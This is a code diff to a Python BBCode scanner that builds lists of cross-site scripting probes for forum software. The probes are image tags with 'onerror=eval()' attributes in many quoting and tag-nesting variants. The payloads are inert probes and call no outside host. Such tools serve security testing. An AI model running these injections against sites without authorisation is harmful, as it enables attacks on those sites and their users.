@@ -6,6 +6,7 @@ class bbcode:
 			self.helper = _helper
 			self.helper.verbose(2,"init BBCode Class")
 			self._supported = 0
+			self.tag_in_img = False
 			# FORMAT: (tag name, typ, useable, valid data list)
 			# tag - Tag name (b,u,i,...)
 			# typ -
@@ -63,6 +64,11 @@ class bbcode:
 			_helper.error("bbcode.__init__()")
 			_helper.error(traceback.format_exc())
 			
+	def get_valid_data(self,_tag):
+		for tag in self.bbcodes:
+			if tag[0] == _tag:
+				return tag[2]
+	
 	def create(self,_tag,_data="",_value=None):
 		try:
 			# _value is sth. like [color=#COLOR] [/color]
@@ -94,51 +100,112 @@ class bbcode:
 					self.bbcode_list.append([self.create(code[0]),False])
 					self.bbcode_list.append([self.create(code[0],"test"),False])
 			for bbcode in self.bbcode_list:
-				self.helper.verbose(4,"added to BBCode test: "+str(bbcode[0]))
+				self.helper.verbose(4,"added to BBCode test: "+self.helper.ansi.BLUE+str(bbcode[0][0])+self.helper.ansi.END)
 			self.helper.verbose(1,"created a list with "+str(len(self.bbcode_list))+" BBCodes to test if they exist")
 		except:
 			self.helper.error("bbcode.test_bbcodes()")
 			self.helper.error(traceback.format_exc())
+			
+	def get_supported_bbcodes(self):
+		tag_list = []
+		for tag in self.bbcode_list:
+			if tag[0][1] not in tag_list and tag[1]:
+				for t in self.bbcodes:
+					if t[0] == tag[0][1]:
+						tag_list.append(t)
+		return tag_list
 		
 	def create_bbcode_list_injection(self):
+		
+		if self.tag_in_img:
+			self.helper.verbose(1,"Tag inside [img] tag is possible. Will create injection List for this")
+		
 		if self._supported == 0:
 			self.helper.verbose(1,"no BBCodes are supported? Check your settings again.")
 		else:
 			for bbcode in self.bbcode_list:
 				if bbcode[1]:
-					if bbcode[0][1] == "img":
-						for _inject in [
-								" onerror=eval()",
-								" onerror=eval()",
-								" onerror=\"eval()\"",
-								" onerror=\"eval()\"",
-								" onerror=\'eval()\'",
-								" onerror=\'eval()\'",
-								" onerror=\"eval();\"",
-								" onerror=\"eval();\"",
-								" onerror=\'eval();\'",
-								" onerror=\'eval();\'",
-								" onerror=eval()",
-								" onerror=eval()",
-								" onerror=\"eval()\"",
-								" onerror=\"eval()\"",
-								" onerror=\'eval()\'",
-								" onerror=\'eval()\'",
-								" onerror=\"eval();\"",
-								" onerror=\"eval();\"",
-								" onerror=\'eval();\'",
-								" onerror=\'eval();\'"]:
-							self.bbcode_list_injection.append([self.create("img","","")])
+					if self.tag_in_img:
+						if bbcode[0][1] == "img":
+							# direct image tag injection
+							onerror=[
+									" onerror=eval()",
+									" onerror=eval()",
+									" onerror=\"eval()\"",
+									" onerror=\"eval()\"",
+									" onerror=\'eval()\'",
+									" onerror=\'eval()\'",
+									" onerror=\"eval();\"",
+									" onerror=\"eval();\"",
+									" onerror=\'eval();\'",
+									" onerror=\'eval();\'",
+									"\" onerror=eval()",
+									"\' onerror=eval()",
+									"\" onerror=\"eval()\"",
+									"\' onerror=\"eval()\"",
+									"\" onerror=\'eval()\'",
+									"\' onerror=\'eval()\'",
+									"\" onerror=\"eval();\"",
+									"\' onerror=\"eval();\"",
+									"\" onerror=\'eval();\'",
+									"\' onerror=\'eval();\'"
+									]
+							for _injection in onerror:
+								self.bbcode_list_injection.append([self.create("img",bbcode[0][2]+_injection,""),False])
+							#print self.get_supported_bbcodes()
+							for tag in self.get_supported_bbcodes():
+								for _injection in onerror:
+									#self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+"[/img]","",""),False])
+									self.bbcode_list_injection.append([("[img]["+tag[0]+"]"+_injection+"[/"+tag[0]+"][/img]","",""),False])
+									self.bbcode_list_injection.append([("[img]["+tag[0]+"]"+_injection+"[/img][/"+tag[0]+"]","",""),False])
+									self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"]"+_injection+"[/"+tag[0]+"][/img]","",""),False])
+									self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"]"+_injection+"[/img][/"+tag[0]+"]","",""),False])
+									for valid_data in tag[2]:
+										if tag[1]==1:
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"="+valid_data+"]"+_injection+"[/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"="+valid_data+"]"+_injection+"[/img][/"+tag[0]+"]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"="+valid_data+"]"+_injection+"[/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"="+valid_data+"]"+_injection+"[/img][/"+tag[0]+"]","",""),False])
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"="+valid_data+"]"+valid_data+""+_injection+"[/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"="+valid_data+"]"+valid_data+""+_injection+"[/img][/"+tag[0]+"]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"="+valid_data+"]"+valid_data+" "+_injection+"[/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"="+valid_data+"]"+valid_data+" "+_injection+"[/img][/"+tag[0]+"]","",""),False])
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"="+valid_data+""+_injection+"][/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"="+valid_data+""+_injection+"][/img][/"+tag[0]+"]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"="+valid_data+""+_injection+"][/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"="+valid_data+""+_injection+"][/img]["+tag[0]+"]","",""),False])
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"="+valid_data+""+_injection+"]"+valid_data+" [/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"="+valid_data+""+_injection+"]"+valid_data+" [/img]["+tag[0]+"]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"="+valid_data+""+_injection+"]"+valid_data+" [/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"="+valid_data+""+_injection+"]"+valid_data+" "+_injection+"[/img][/"+tag[0]+"]","",""),False])
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"="+_injection+"][/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"="+_injection+"][/img][/"+tag[0]+"]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"="+_injection+"][/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"="+_injection+"][/img][/"+tag[0]+"]","",""),False])
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"="+_injection+"]"+valid_data+" [/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"="+_injection+"]"+valid_data+" [/img][/"+tag[0]+"]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"="+_injection+"]"+valid_data+" [/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"="+_injection+"]"+valid_data+" "+_injection+"[/img]["+tag[0]+"]","",""),False])
+										elif tag[1]==0:
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"]"+valid_data+""+_injection+"[/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]["+tag[0]+"]"+valid_data+""+_injection+"[/img][/"+tag[0]+"]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"]"+valid_data+""+_injection+"[/"+tag[0]+"][/img]","",""),False])
+											self.bbcode_list_injection.append([("[img]"+bbcode[0][2]+" ["+tag[0]+"]"+valid_data+""+_injection+"[/img][/"+tag[0]+"]","",""),False])
+							
+			for bbcode in self.bbcode_list_injection:
+				self.helper.verbose(4,"added to BBCode XSS injection test: "+self.helper.ansi.BLUE+str(bbcode[0][0])+self.helper.ansi.END)
+			self.helper.verbose(1,"created a list with "+str(len(self.bbcode_list_injection))+" BBCodes to test XSS injection")
 					
 	def check_bbcode_list(self,_data,_list):
-		self._supported = 0
+		_supported = 0
 		for bbcode in _list:
 			if bbcode[0][0] in _data:
 				bbcode[1] = False
-				self.helper.verbose(4,"BBCode not supported: "+bbcode[0][0])
+				self.helper.verbose(4,"BBCode not supported: "+self.helper.ansi.RED+bbcode[0][0]+self.helper.ansi.END)
 			else:
 				bbcode[1] = True
-				self._supported+=1
-				self.helper.verbose(3,"BBCode probably supported: "+bbcode[0][0])
-		self.helper.verbose(2,str(self._supported)+" from "+str(len(self.bbcode_list))+" checked BBCodes probably supported")
-					
+				_supported+=1
+				self.helper.verbose(3,"BBCode probably supported: "+self.helper.ansi.GREEN+bbcode[0][0]+self.helper.ansi.END)
+		self.helper.verbose(1,str(_supported)+" from "+str(len(_list))+" checked BBCodes probably supported")
+		
+		return _supported
